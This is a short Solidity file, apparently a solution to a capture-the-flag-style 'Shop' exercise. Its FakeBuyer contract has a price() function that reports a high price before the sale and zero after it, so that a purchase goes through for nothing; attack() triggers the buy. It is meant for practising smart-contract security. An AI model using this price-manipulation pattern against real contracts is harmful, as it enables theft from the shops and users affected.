// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../../../Exercise/Stage1/21/Shop.sol";
import "hardhat/console.sol";

contract FakeBuyer is Buyer {
    //    safe math
    address private userAddress;
    Shop shop;
    mapping(address => uint) public count;
    uint currentShopPrice;

    constructor(address inputUserAddress) public {
        userAddress = inputUserAddress;
    }

    function attack(uint fakeAmount) public {
        shop.buy();
    }

    function setContract(Shop importingShop) external {
        shop = importingShop;
    }


    function price() external override view returns (uint) {
        if (shop.isSold()) {
            return 0;
        } else {
            return 102;
        }
        return 0;
    }

}
